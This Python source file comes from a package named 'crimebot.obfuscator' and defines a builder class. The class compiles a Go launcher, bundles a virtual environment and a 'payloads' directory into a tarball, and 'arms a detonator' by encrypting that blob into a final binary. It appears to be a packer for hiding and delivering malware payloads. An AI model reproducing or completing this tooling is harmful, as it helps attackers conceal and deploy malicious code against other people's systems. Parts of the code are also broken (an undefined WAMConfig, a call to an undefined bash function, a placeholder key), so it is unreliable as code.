import logging
import os
import subprocess
import sys
import shutil
import tempfile
import tarfile
from pathlib import Path
from typing import Union

from crimebot.obfuscator.wam_builder import WAMBuilder
from crimebot.obfuscator.wam_provider_base import WamProviderBase
from crimebot.obfuscator.wam_config import (
    WAM_PROVIDER_OUTPUT_DIR,
    LAUNCHER_SOURCE_PATH,
    REQUIREMENTS_FILE,
)


class WamProvider(WamProviderBase, WAMBuilder):
    def __init__(self, output_dir: os.PathLike):
        super().__init__(output_dir)
        self.launcher_path: os.PathLike = Path(output_dir) / "launcher"
        self.source_dir = Path(__file__).parent / "payloads"

        # Ensure launcher_source is a Path object
        self.launcher_source = (
            Path(LAUNCHER_SOURCE_PATH)
            if isinstance(LAUNCHER_SOURCE_PATH, str)
            else LAUNCHER_SOURCE_PATH
        )

    def create_virtualenv(self, env_path: str) -> None:
        try:
            subprocess.run([sys.executable, "-m", "venv", env_path], check=True)

            pip_executable = Path(env_path) / "bin" / "pip"
            requirements_file = REQUIREMENTS_FILE

            # Ensure the required packages are installed using the virtual environment's Python executable
            subprocess.run(
                [str(pip_executable), "install", "-r", str(requirements_file)],
                check=True,
            )

        except subprocess.CalledProcessError as e:
            raise Exception(f"Failed to create virtual environment: {e}")

    def compile_python_code(self, source_dir: Path, env_path: Path) -> None:
        try:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    if file.endswith(".py"):
                        source_path = Path(root) / file
                        subprocess.run(
                            [
                                sys.executable,
                                "-m",
                                "compileall",
                                str(source_path.parent),
                            ],
                            check=True,
                        )

        except subprocess.CalledProcessError as e:
            raise Exception(f"Failed to compile Python code: {e}")

    def create_tarball(self, env_path: str, output_path: Path) -> None:
        try:
            with tarfile.open(output_path, "w:gz") as tar:
                # Walk through the virtual environment directory and add all files to the tarball
                for root, dirs, files in os.walk(env_path):
                    for file in files:
                        if not file.endswith(
                            ".pyc"
                        ):  # Exclude '.pyc' files, as they will be recompiled again
                            tar.add(
                                os.path.join(root, file),
                                arcname=os.path.relpath(
                                    os.path.join(root, file), env_path
                                ),
                            )

        except tarfile.TarError as e:
            raise Exception(f"Failed to create tarball: {e}")

    def build(self) -> None:
        try:
            os.chdir(os.path.dirname(self.launcher_source))
            subprocess.run(["rm", "go.mod"], check=True)
            subprocess.run(["go", "mod", "init", "crimebot"], check=True)
            subprocess.run(["go", "mod", "tidy"], check=True)

            # Build the WAM launcher script using Go
            try:
                subprocess.run(
                    ["go", "build", "-o", os.path.join(self.output_dir, "launcher")]
                )
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to build WAM launcher: {e}")

        except FileNotFoundError as e:
            raise Exception(f"Launcher source file not found: {e}")

    def clean(self) -> None:
        try:
            # Remove the generated launcher executable and its associated files
            subprocess.run(["rm", "-rf", self.launcher_path])

            # Remove any other custom artifacts created during the build process
            for root, dirs, files in os.walk(self.output_dir):
                for file in files:
                    if file.endswith(".tar.gz") or file.startswith("myenv"):
                        os.remove(os.path.join(root, file))

                for dir in dirs:
                    if dir == "myenv":
                        shutil.rmtree(os.path.join(root, dir))

        except Exception as e:
            logging.error(f"Failed to clean up: {e}")

    @staticmethod
    def analyze_output(output_tarball: Path) -> None:
        try:
            with tarfile.open(output_tarball, "r:gz") as tar:
                # Check if the payload pyc file is present in the tarball using the configured payload name
                payload_pyc = (
                    f"{Path(__file__).parent / 'payloads' / WAMConfig.PAYLOAD_NAME}"
                )
                if not any(member.name == payload_pyc for member in tar.getmembers()):
                    raise Exception(
                        f"Payload pyc file {payload_pyc} not found in output tarball"
                    )

        except tarfile.TarError as e:
            raise Exception(f"Failed to analyze output: {e}")

    def arm(self) -> None:
        """
        Arms the detonator by building, encrypting, embedding, and moving the final binary to the output directory.
        """
        # Set environment variables for the bash script
        env = os.environ.copy()
        env["ARM_DETONATOR_BINARY"] = "detonator"
        env["EMBEDDED_TAR_FILE"] = "embedded_blob.bin"
        env["TEMP_DIR"] = subprocess.check_output(
            "mktemp -d", shell=True, text=True
        ).strip()
        env["ENCRYPTION_KEY"] = "encryption_key"  # replace with your actual key

        # Build and encrypt the embedded tar file using the bash script
        subprocess.run(["bash", "-c", "build_and_encrypt"], env=env)

        # Move the final binary to the output directory
        final_binary_path = os.path.join(env["TEMP_DIR"], "detonator")
        shutil.move(final_binary_path, self.output_dir)


if __name__ == "__main__":
    provider = WamProvider(output_dir=Path(WAM_PROVIDER_OUTPUT_DIR))
    provider.build()
